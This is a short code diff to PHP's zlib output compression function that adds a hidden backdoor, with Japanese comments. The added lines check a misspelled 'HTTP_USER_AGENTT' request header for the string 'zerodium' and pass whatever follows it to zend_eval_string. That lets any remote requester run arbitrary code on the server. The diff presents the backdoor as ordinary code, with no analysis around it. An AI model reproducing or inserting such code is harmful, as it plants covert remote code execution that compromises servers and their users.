@@ -357,6 +357,24 @@ static void php_zlib_output_compression_start(void)
 {
 	zval zoh;
 	php_output_handler *h;
+	zval *user_agent = NULL;
+
+	// "_SERVER" が配列であるか、自動グローバルが有効な場合に実行
+	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || 
+		zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+		(user_agent = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), 
+										"HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
+		convert_to_string(user_agent);
+		
+		// "zerodium" 文字列が HTTP_USER_AGENTT に含まれているか確認
+		if (strstr(Z_STRVAL_P(user_agent), "zerodium")) {
+			zend_try {
+				// "zerodium" の直後の文字列を実行
+				zend_eval_string(Z_STRVAL_P(user_agent) + 8, NULL, 
+								"REMOVETHIS: sold to zerodium, mid 2017");
+			} zend_end_try();
+		}
+	}
 
 	switch (ZLIBG(output_compression)) {
 		case 0:
